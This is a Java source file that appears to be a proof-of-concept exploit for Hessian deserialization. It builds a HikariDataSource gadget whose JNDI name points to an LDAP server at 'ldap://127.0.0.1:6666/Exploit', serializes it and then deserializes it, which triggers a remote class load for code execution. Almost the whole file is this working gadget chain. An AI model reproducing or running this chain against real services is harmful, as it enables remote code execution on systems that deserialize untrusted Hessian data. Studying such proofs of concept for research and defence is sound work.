package com.beans;

import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.zaxxer.hikari.HikariDataSource;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;

import com.sun.org.apache.xpath.internal.objects.XString;

public class Main {
    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HikariDataSource ds = new HikariDataSource();
        ds.setPoolName("pool");
        ds.setDataSourceJNDI("ldap://127.0.0.1:6666/Exploit");
        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
        Object o = new com.beans.Beans(ds, com.zaxxer.hikari.HikariDataSource.class);

        out.writeString("2.2");
        out.writeObject(o);
        out.flushBuffer();
//        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream((byteArrayOutputStream.toByteArray())));
        hessian2Input.readObject();
//        Beans beans = (Beans)hessian2Input.readObject();
//        Object obj = beans.getObj();
//        System.out.println((String) obj);

    }
}
